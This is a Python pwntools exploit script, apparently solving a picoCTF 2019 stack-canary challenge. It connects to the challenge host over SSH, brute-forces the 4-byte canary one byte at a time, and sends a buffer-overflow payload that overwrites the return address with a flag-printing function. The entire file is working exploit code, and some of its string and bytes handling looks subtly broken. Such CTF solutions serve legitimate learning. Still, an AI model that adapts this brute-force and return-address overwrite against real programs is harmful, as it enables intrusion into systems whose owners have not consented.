from pwn import * 

canary = ''
offset = 32

if args['REMOTE']:
    s = ssh(host='2019shell1.picoctf.com', user='jib1337', password='notmyrealpasswordlol')
    target = '{'
else:
    target = 'flag'

elf = context.binary = ELF('vuln')

info('Retrieving canary value...')

while len(canary) != 4:

    for i in range(0,256):

        info('Trying byte %d now (input length: %d)' % (i, offset + len(canary) + 1))

        if args['REMOTE']:
            p = s.process('vuln', cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
        else:
            p = process(elf.path)
        
        p.recvuntil(b'> ')
        p.sendline(str(offset + len(canary) + 1))

        p.recvuntil(b'> ')
        inputLine = b'A' * offset + canary + chr(i)
        info('Sending: %s' % inputLine)
        p.sendline(inputLine)

        outputLine = p.recvline().decode()
        info(outputLine)
        p.close()

        if 'Ok' in outputLine:
            info('Found canary byte: %s' % chr(i))
            canary += chr(i)
            break

payload = inputLine + b'B' * cyclic_find(0x61616165) + p16(elf.symbols.display_flag)

print('Payload: ' + hexdump(payload))
print('Size: ' + str(len(payload)))

assert len(canary) == 4

info('Canary value: %s' % canary)

response = ''
while target not in response:
    
    if args['REMOTE']:
        p = s.process('vuln', cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
    else:
        p = process(elf.path)

    p.recvuntil(b'> ')
    p.sendline(str(len(payload)))
    p.recvuntil(b'> ')
    p.sendline(payload)
    response = p.recvall(timeout=0.5)
    print(response)
    p.close()

print(response)
